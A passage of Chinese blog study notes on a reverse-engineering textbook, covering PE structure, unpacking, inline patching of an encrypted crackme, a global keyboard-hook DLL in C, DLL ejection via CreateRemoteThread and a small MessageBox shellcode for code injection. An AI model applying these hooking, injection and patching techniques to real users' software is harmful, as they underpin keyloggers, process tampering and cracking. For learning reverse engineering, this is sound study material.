id="0x06-函数调用约定"><a href="#0x06-函数调用约定" class="headerlink" title="0x06-函数调用约定"></a>0x06-函数调用约定</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336046853.png" alt="cdecl"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336074342.png" alt="stdcall"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336102197.png" alt="stdcall"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336128921.png" alt="fastcall"></p><h1 id="0x07-鸡汤"><a href="#0x07-鸡汤" class="headerlink" title="0x07-鸡汤"></a>0x07-鸡汤</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336265323.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336281377.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649336312616.png"></p><h1 id="0x08-PE文件格式"><a href="#0x08-PE文件格式" class="headerlink" title="0x08-PE文件格式"></a>0x08-PE文件格式</h1><p>相当于复习了</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649337195834.png" alt="RVA与VA"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649342412672.png" alt="映像"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649342725432.png" alt="显式链接与隐式链接"></p><h2 id="为什么要有导入表"><a href="#为什么要有导入表" class="headerlink" title="为什么要有导入表"></a>为什么要有导入表</h2><p>1、是因为不同版本的dll函数存放的地址也不同，为了能正常调用函数，编译器准备了存放函数实际地址的位置</p><p>2、重定位，多个dll无法同时装载到1000000h</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649343048380.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649377368994.png" alt="导入表"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649377721063.png" alt="导入表结构"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649377867593.png" alt="IAT输入顺序"></p><p>因为存在按序号导入也有按名称导入，所以获取函数起始地址的时候有两种方式</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649378338899.png" alt="程序运行中的IAT表"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649379766533.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649379898617.png" alt="导出表"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380029780.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380146114.png" alt="获取函数地址"></p><p>即通过函数名称导出：先去函数名称表依次比较，找到相同时，得到索引index，去导出序号表根据index取出里面的值作为新的索引index_new，再去函数地址表找到函数地址</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380438215.png" alt="按序号导出"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649380791104.png" alt="patched PE"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649381026465.png"></p><h1 id="0x09-运行时压缩"><a href="#0x09-运行时压缩" class="headerlink" title="0x09-运行时压缩"></a>0x09-运行时压缩</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649381576476.png" alt="压缩器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649381637551.png" alt="保护器"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382063431.png" alt="保护器种类"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382125254.png" alt="upx加壳后的notepad.exe"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382165657.png"></p><h1 id="0x0A-调试UPX压缩的notepad程序"><a href="#0x0A-调试UPX压缩的notepad程序" class="headerlink" title="0x0A-调试UPX压缩的notepad程序"></a>0x0A-调试UPX压缩的notepad程序</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382397337.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382481059.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382514246.png" alt="OD跟踪命令"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382717431.png" alt="解码循环"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382768527.png" alt="恢复地址"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649382833291.png" alt="IAT"></p><h1 id="0x0B-基址重定位表"><a href="#0x0B-基址重定位表" class="headerlink" title="0x0B-基址重定位表"></a>0x0B-基址重定位表</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391242570.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391309699.png" alt="ASLR"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391324972.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649391676854.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470225805.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470309143.png" alt="重定位表中的地址计算"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470391830.png" alt="重定位表分块大小原因"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470561427.png" alt="重定位"></p><h1 id="0x0C-从可执行文件中删除重定位表"><a href="#0x0C-从可执行文件中删除重定位表" class="headerlink" title="0x0C-从可执行文件中删除重定位表"></a>0x0C-从可执行文件中删除重定位表</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470715916.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649470727996.png" alt="步骤"></p><h1 id="0x0D-Upack-PE文件头详细分析"><a href="#0x0D-Upack-PE文件头详细分析" class="headerlink" title="0x0D-Upack PE文件头详细分析"></a>0x0D-Upack PE文件头详细分析</h1><h2 id="重叠文件头"><a href="#重叠文件头" class="headerlink" title="重叠文件头"></a>重叠文件头</h2><p>因为DOS头尾部有一堆垃圾数据，所以将其修改并去除垃圾数据并修改e_lfanew，可以实现文件头重叠</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471521418.png"></p><h2 id="IMAGE-FILE-HEADER-SizeofOptionalHeader"><a href="#IMAGE-FILE-HEADER-SizeofOptionalHeader" class="headerlink" title="IMAGE_FILE_HEADER.SizeofOptionalHeader"></a>IMAGE_FILE_HEADER.SizeofOptionalHeader</h2><p>通过修改可选PE头的大小，可以向文件头插入解码代码。</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471656793.png" alt="可选PE头存在的原因"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471692584.png"></p><h2 id="IMAGE-OPTINAL-HEADER-NumberOfRvaAndSizes"><a href="#IMAGE-OPTINAL-HEADER-NumberOfRvaAndSizes" class="headerlink" title="IMAGE_OPTINAL_HEADER.NumberOfRvaAndSizes"></a>IMAGE_OPTINAL_HEADER.NumberOfRvaAndSizes</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471789389.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649471971897.png"></p><h2 id="IMAGE-SECTION-HEADER"><a href="#IMAGE-SECTION-HEADER" class="headerlink" title="IMAGE_SECTION_HEADER"></a>IMAGE_SECTION_HEADER</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472047897.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472187949.png" alt="UPcak的重叠特征"></p><p>也就是说Upack先将notepad.exe压缩至第二个节区，运行时将第二个节区的代码解压至第一个节区</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472217512.png" alt="解压后的第一个节区"></p><h2 id="RVA-to-RAW"><a href="#RVA-to-RAW" class="headerlink" title="RVA to RAW"></a>RVA to RAW</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472407155.png"></p><h2 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472531391.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472588438.png"></p><h2 id="导入地址表"><a href="#导入地址表" class="headerlink" title="导入地址表"></a>导入地址表</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649472781271.png"></p><h1 id="0x0E-Upack调试-查找OEP"><a href="#0x0E-Upack调试-查找OEP" class="headerlink" title="0x0E-Upack调试-查找OEP"></a>0x0E-Upack调试-查找OEP</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649473884976.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649473962763.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649473977290.png"></p><h1 id="0x0F-内嵌补丁"><a href="#0x0F-内嵌补丁" class="headerlink" title="0x0F-内嵌补丁"></a>0x0F-内嵌补丁</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649474031264.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649474156707.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649474124006.png" alt="内嵌补丁与代码补丁的区别"></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>先对附件进行分析</p><p>弹出的对话框要求解压其本身</p><p>对地址4010F5的第一次异或</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482257261.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482352736.png" alt="401007地址的值异或7"></p><p>再次对4010F5进行异或操作，解密</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482387580.png"></p><p>可以看到这里对地址的值进行校验，每次取出四个字节相加，所以当我们修改了内容时需要对校验部分修改</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482453215.png" alt="校验"></p><p>所以解码完的部分存在我们要找的字符串</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482646487.png"></p><p>对401090地址的值进行异或</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482685919.png" alt="异或"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482728534.png" alt="大致流程"></p><h2 id="内嵌补丁练习"><a href="#内嵌补丁练习" class="headerlink" title="内嵌补丁练习"></a>内嵌补丁练习</h2><p>因为我们要打补丁的字符串位于B区，而B区进行了双重加密，而且对其内容进行了校验，所以采用内嵌补丁</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649482908373.png" alt="内嵌补丁"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649483145646.png"></p><p>因为节区要对齐，所以可能存在空白节区，那我们就可以在节区末尾添加我们的洞穴代码</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649484195488.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649484706889.png"></p><p>然后让程序先跳转到我们这个地址，再在这段代码最后一句，加上跳回原本程序的代码</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649484859772.png" alt="程序原本的跳转"></p><p>但是要注意一点，就是我们插入的是已经解完密的jmp，而实际在文件中，这里的jmp是被加密的，所以要先对我们的修改进行加密，也就是xor 7</p><h1 id="0x10-Windows消息钩取"><a href="#0x10-Windows消息钩取" class="headerlink" title="0x10-Windows消息钩取"></a>0x10-Windows消息钩取</h1><p>windows消息机制</p><p><a href="https://blog.csdn.net/alzzw/article/details/108217879">https://blog.csdn.net/alzzw/article/details/108217879</a></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649486465228.png" alt="windows消息流"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649486637330.png" alt="消息钩取工作原理"></p><p>我们设置的钩子能在应用程序之前获取到OS相应信息</p><blockquote><p>SetwindowsHookEx()</p><p>HHOOK SetWindowsHookExA(<br>  [in] int       idHook,// 要安装的挂钩过程的类型<br>  [in] HOOKPROC  lpfn,// 指向挂钩过程的指针<br>  [in] HINSTANCE hmod,// 所指向的挂钩过程的 DLL 的句柄<br>  [in] DWORD     dwThreadId<br>);</p></blockquote><p>main.cpp</p><pre class="language-c" data-language="c"><code class="language-c">#include "stdio.h"#include "conio.h"#include "windows.h"#define    DEF_DLL_NAME        "KeyHook.dll"#define    DEF_HOOKSTART        "HookStart"#define    DEF_HOOKSTOP        "HookStop"typedef void (*PFN_HOOKSTART)();typedef void (*PFN_HOOKSTOP)();void main(){    HMODULE    hDll = NULL;    PFN_HOOKSTART    HookStart = NULL;    PFN_HOOKSTOP    HookStop = NULL;    char    ch = 0;    // 加载KeyHook.dll    hDll = LoadLibraryA(DEF_DLL_NAME);    if (hDll == NULL)    {        printf("LoadLibrary(%s) failed!!! [%d]", DEF_DLL_NAME, GetLastError());        return;    }    // 获取导出函数地址    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);    HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);    // 开始钩取    HookStart();    // 等待，直到用户输入“q”    printf("press 'q' to quit!\n");    while (_getch() != 'q');    // 终止钩子    HookStop();    // 卸载KeyHook.dll    FreeLibrary(hDll);}</code></pre><p>KeyHook.dll</p><pre class="language-c" data-language="c"><code class="language-c">//KeyHook.cpp #include "stdio.h"#include "windows.h" //定义目标进程名为notepad.exe#define DEF_PROCESS_NAME "notepad.exe" //定义全局变量HINSTANCE g_hInstance = NULL;HHOOK g_hHook = NULL; //DllMain()函数在DLL被加载到进程后会自动执行BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved){switch( dwReason ){case DLL_PROCESS_ATTACH:g_hInstance = hinstDLL;break; case DLL_PROCESS_DETACH:break;} return TRUE;} //LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){char szPath[MAX_PATH] = {0,};char *p = NULL;if( nCode &gt;= 0 ){ //释放键盘按键时，bit 31 : 0 =&gt; press, 1 =&gt; releaseif( !(lParam &amp; 0x80000000) ){GetModuleFileNameA(NULL, szPath, MAX_PATH);p = strrchr(szPath, '\\'); //比较当前进程名称，若为notepad.exe，则消息不会传递给应用程序或下一个钩子函数//_stricmp()函数用于比较字符串，i表示不区分大小写，若两个值相等则返回0if( !_stricmp(p + 1, DEF_PROCESS_NAME) ){return 1;}}} //比较当前进程名称，若非notepad.exe，则消息传递给应用程序或下一个钩子函数return CallNextHookEx(g_hHook, nCode, wParam, lParam);} //在C++中调用C的库文件，用extern "C"告知编译器，因为C++支持函数重载而C不支持，两者的编译规则不同#ifdef __cplusplusextern "C"{#endif//__declspec，针对编译器的关键字，用于指出导出函数//当调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链__declspec(dllexport) void HookStart(){g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);} __declspec(dllexport) void HookStop(){if(g_hHook){UnhookWindowsHookEx(g_hHook);g_hHook = NULL;}}#ifdef __cplusplus}#endif</code></pre><p>调用导出函数HookStart()时，SetWindowsHookEx()函数就会把KeyboardProc()添加到键盘钩链</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649491980722.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649492021056.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649492216354.png" alt="调试过程"></p><h1 id="0x11-恶意键盘记录器"><a href="#0x11-恶意键盘记录器" class="headerlink" title="0x11-恶意键盘记录器"></a>0x11-恶意键盘记录器</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649492949992.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649493348476.png" alt="DLL注入"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649493419347.png" alt="DLL_Main函数"></p><p><a href="https://blog.csdn.net/tiandao2009/article/details/79839182">https://blog.csdn.net/tiandao2009/article/details/79839182</a>  dllmain函数的不同情形</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649494188248.png" alt="DLL注入方法"></p><h1 id="0x12-DLL卸载"><a href="#0x12-DLL卸载" class="headerlink" title="0x12-DLL卸载"></a>0x12-DLL卸载</h1><h2 id="获取目标进程的句柄"><a href="#获取目标进程的句柄" class="headerlink" title="获取目标进程的句柄"></a>获取目标进程的句柄</h2><pre class="language-c" data-language="c"><code class="language-c">hProcess=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPID);</code></pre><p>该语句使用进程ID来获取目标进程的进程句柄，下面用获得的进程句柄调用CreateRemoteThread()</p><h2 id="获取FreeLibrary-地址"><a href="#获取FreeLibrary-地址" class="headerlink" title="获取FreeLibrary()地址"></a>获取FreeLibrary()地址</h2><pre class="language-c" data-language="c"><code class="language-c">hModule=GetModule(L"kernel32.dll);pThreadProc=(LPTHREAD_START_ROUTINE)GetProcAddress(hModule,"FreeLibrary");</code></pre><p>若要使目标进程自己调用FreeLibrary()，需要先获得FreeLibrary()的地址。然而上述代码获得的不是加载到目标进程中的FreeLibrary()的地址，而是EjectDll.exe进程中FreeLibrary()的地址，但是FreeLibrary在所有进程中地址是相同的</p><h2 id="在目标进程中运行线程"><a href="#在目标进程中运行线程" class="headerlink" title="在目标进程中运行线程"></a>在目标进程中运行线程</h2><pre class="language-c" data-language="c"><code class="language-c">hThread=CreateRemoteThread(hProcess,NULL,0,pThreadProc,me.modBaseAddr,0,NULL);</code></pre><p>pThreadProc参数是FreeLibrary()的地址，me.modBaseAddr参数是要卸载的DLL的加载地址。将线程函数指定为FreeLibrary()函数，并且把DLL加载地址传递给线程参数，这样就在目标进程中成功调用了FreeLibrary函数</p><blockquote><p>CreateRemoteThread()原意是在外部线程调用执行线程函数，不过这里的线程函数换成了FreeLibrary()</p></blockquote><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649660793447.png"></p><h1 id="0x13-通过修改PE加载DLL"><a href="#0x13-通过修改PE加载DLL" class="headerlink" title="0x13-通过修改PE加载DLL"></a>0x13-通过修改PE加载DLL</h1><p>也就是修改导入表来使得PE文件运行时直接加载dll</p><p>晚点看</p><h1 id="0x14-代码注入"><a href="#0x14-代码注入" class="headerlink" title="0x14-代码注入"></a>0x14-代码注入</h1><p>代码注入是一种向目标进程插入独立运行代码并使之运行的技术，他一般调用CreateRemoteThread()以远程线程形式运行插入的代码，所以也被称为线程注入</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649662082787.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649662157677.png"></p><p>也就是说DLL是将整个DLL注入进程中，而代码注入只是注入必要的代码，所以同时也要报要操作的数据进行注入</p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649662257437.png" alt="使用代码注入的原因"></p><h1 id="0x15-汇编代码注入"><a href="#0x15-汇编代码注入" class="headerlink" title="0x15-汇编代码注入"></a>0x15-汇编代码注入</h1><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649924174583.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649925196328.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649925229842.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649925283278.png" alt="关闭自动填充nop"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649926423283.png"></p><p>接下来将插入的asm的机器码进行复制，并修改格式</p><p>得到</p><pre class="language-c" data-language="c"><code class="language-c">char shellcode[] = {0x55,0x8B,0xEC,0x8B,0x75,0x08,0x68,0x6C,0x6C,0x00,0x00,0x68,0x33,0x32,0x2E,0x64,0x68,0x75,0x73,0x65,0x72,0x54,0xFF,0x16,0x68,0x6F,0x78,0x41,0x00,0x68,0x61,0x67,0x65,0x42,0x68,0x4D,0x65,0x73,0x73,0x54,0x50,0xFF,0x56,0x04,0x6A,0x00,0xE8,0x0C,0x00,0x00,0x00,0x52,0x65,0x76,0x65,0x72,0x73,0x65,0x43,0x6F,0x72,0x65,0x00,0xE8,0x14,0x00,0x00,0x00,0x77,0x77,0x77,0x2E,0x72,0x65,0x76,0x65,0x72,0x73,0x65,0x63,0x6F,0x72,0x65,0x2E,0x63,0x6F,0x6D,0x00,0x6A,0x00,0xFF,0xD0,0x33,0xC0,0x8B,0xE5,0x5D,0xC3};</code></pre><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1649985152689.png"></p><p><img src="/2022/04/07/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/1650001282882.png"></p><h1 id="0x16-API钩取"><a href="#0x16-API钩取" class="headerlink" 